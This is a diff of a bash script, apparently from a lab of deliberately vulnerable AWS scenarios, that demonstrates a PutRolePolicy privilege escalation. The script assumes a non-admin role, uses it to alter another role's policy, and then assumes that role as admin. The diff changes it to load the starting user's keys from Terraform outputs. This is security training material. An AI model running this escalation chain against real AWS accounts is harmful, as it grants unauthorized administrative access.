@@ -6,20 +6,41 @@
 set -e  # Exit on any error
 
 # Configuration
-PROFILE="pl-pathfinder-starting-user-prod"
 REGION="us-west-2"
 
 # Disable paging for AWS CLI
 export AWS_PAGER=""
 
-# Get the account ID from the profile
-echo "🔍 Getting account ID from profile: $PROFILE"
-ACCOUNT_ID=$(aws sts get-caller-identity --profile $PROFILE --query Account --output text)
-echo "📋 Account ID: $ACCOUNT_ID"
+# Navigate to the Terraform root directory (6 levels up from scenario directory)
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../../../.." && pwd)"
 
-# Role ARNs
-ROLE_A_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-role-a-non-admin"
-ROLE_B_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-role-b-admin"
+echo "🔍 Retrieving credentials from Terraform outputs..."
+cd "$TERRAFORM_ROOT"
+
+# Get the grouped module output
+MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_multi_hop_to_admin_putrolepolicy_on_other.value // empty')
+
+if [ -z "$MODULE_OUTPUT" ]; then
+    echo "❌ Error: Could not retrieve module outputs. Make sure the scenario is deployed."
+    exit 1
+fi
+
+# Extract credentials and resource information from grouped output
+STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
+STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
+ROLE_A_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.role_a_arn')
+ROLE_B_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.role_b_arn')
+STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
+
+echo "✅ Retrieved credentials for starting user: $STARTING_USER_NAME"
+echo "📋 RoleA ARN: $ROLE_A_ARN"
+echo "📋 RoleB ARN: $ROLE_B_ARN"
+
+# Set environment variables for starting user
+export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+export AWS_DEFAULT_REGION="$REGION"
 
 echo ""
 echo "🎯 Starting PutRolePolicy privilege escalation attack..."
@@ -31,7 +52,6 @@ echo "🔄 Step 1: Assuming RoleA (non-admin role)..."
 echo "Role ARN: $ROLE_A_ARN"
 
 ROLE_A_CREDENTIALS=$(aws sts assume-role \
-    --profile $PROFILE \
     --role-arn $ROLE_A_ARN \
     --role-session-name "attack-role-a" \
     --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
@@ -94,8 +114,8 @@ ROLE_B_SESSION_TOKEN=$(echo $ROLE_B_CREDENTIALS | cut -d' ' -f3)
 
 echo "✅ Successfully assumed RoleB with admin permissions!"
 
-echo "Waiting 10 seconds..."
-sleep 10
+echo "⏳ Waiting 15 seconds for IAM policy propagation..."
+sleep 15
 
 # Step 4: Demonstrate admin access by listing S3 buckets
 echo ""
@@ -157,7 +177,7 @@ echo ""
 echo "🎉 SUCCESS! Successfully exploited PutRolePolicy privilege escalation!"
 echo "===================================================================="
 echo "📊 Attack Summary:"
-echo "   - Started with profile: $PROFILE"
+echo "   - Started with user: $STARTING_USER_NAME"
 echo "   - Assumed RoleA (non-admin): $ROLE_A_ARN"
 echo "   - Modified RoleB's policies using iam:PutRolePolicy"
 echo "   - Assumed RoleB (now with admin permissions): $ROLE_B_ARN"
